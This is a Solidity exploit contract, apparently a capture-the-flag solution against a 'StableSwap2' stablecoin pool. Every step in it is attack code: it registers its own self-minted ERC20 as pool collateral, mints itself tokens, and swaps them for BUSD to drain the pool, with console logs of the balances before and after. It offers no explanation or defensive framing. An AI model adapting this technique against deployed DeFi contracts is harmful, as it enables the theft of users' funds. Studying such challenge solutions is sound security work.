// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "./StableSwap2.sol";
import "./Setup.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "hardhat/console.sol";

contract Exploit is ERC20 {
    StableSwap2 instance;

    constructor(StableSwap2 _instance) payable ERC20("MyToken", "MT") {
        instance = _instance;
    }

    function finalize(Setup setup) external payable {
        setup.faucet(1000);
        console.log("TOTAL VALUE", instance.totalValue());
        console.log("USDC BALANCE", setup.USDC().balanceOf(address(this)));
        console.log("USDT BALANCE", setup.USDT().balanceOf(address(this)));
        console.log("BUSD BALANCE", setup.BUSD().balanceOf(address(this)));
        console.log("USDC", setup.USDC().balanceOf(address(instance)));
        console.log("USDT", setup.USDT().balanceOf(address(instance)));
        console.log("BUSD", setup.BUSD().balanceOf(address(instance)));
        console.log("MY BALANCE", instance.balances(address(this)));

        setup.USDC().approve(address(instance), type(uint256).max);
        setup.USDT().approve(address(instance), type(uint256).max);
        setup.BUSD().approve(address(instance), type(uint256).max);

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = setup.USDC().balanceOf(address(this));
        amounts[1] = setup.USDT().balanceOf(address(this));
        amounts[2] = setup.BUSD().balanceOf(address(this));
        instance.mint(amounts);
        instance.donate(1);

        console.log("SETUP", address(setup));
        console.log("OWNER", instance.owner());

        instance.addCollateral(address(this));
        this.approve(address(instance), type(uint256).max);
        _mint(address(this), 10000);
        instance.swap(address(this), 10000, address(setup.BUSD()));

        console.log("TOTAL VALUE", instance.totalValue());
        console.log("USDC BALANCE", setup.USDC().balanceOf(address(this)));
        console.log("USDT BALANCE", setup.USDT().balanceOf(address(this)));
        console.log("BUSD BALANCE", setup.BUSD().balanceOf(address(this)));
        console.log("USDC", setup.USDC().balanceOf(address(instance)));
        console.log("USDT", setup.USDT().balanceOf(address(instance)));
        console.log("BUSD", setup.BUSD().balanceOf(address(instance)));
        console.log("MY BALANCE", instance.balances(address(this)));
    }

    receive() external payable {}
}
